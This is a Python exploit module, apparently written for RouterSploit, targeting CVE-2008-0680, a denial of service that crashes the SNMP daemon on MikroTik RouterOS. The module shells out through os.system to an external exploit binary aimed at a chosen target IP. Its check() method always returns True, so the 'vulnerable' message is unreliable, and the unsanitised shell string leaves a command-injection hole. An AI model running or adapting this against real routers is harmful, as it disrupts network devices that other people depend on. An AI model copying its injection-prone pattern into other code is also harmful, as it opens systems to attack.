import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2008-0680",

        "description": "SNMPd in MikroTik RouterOS 3.2 and earlier allows remote attackers  "
                       "to cause a denial of service (daemon crash) via a crafted SNMP SET request. ",

        "authors": (

            "ShadOS",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/5054",

        ),

        "devices": (

            "MicroTik, CVE-2008-0680"
        ),
    }

    target = OptIP("", "description IP")
    source = OptIP("","source IP")
    community = OptString("public","community name")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./{} -s {} -d {} -c {}".format("exploit-db-5054",self.source,self.target,self.community)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
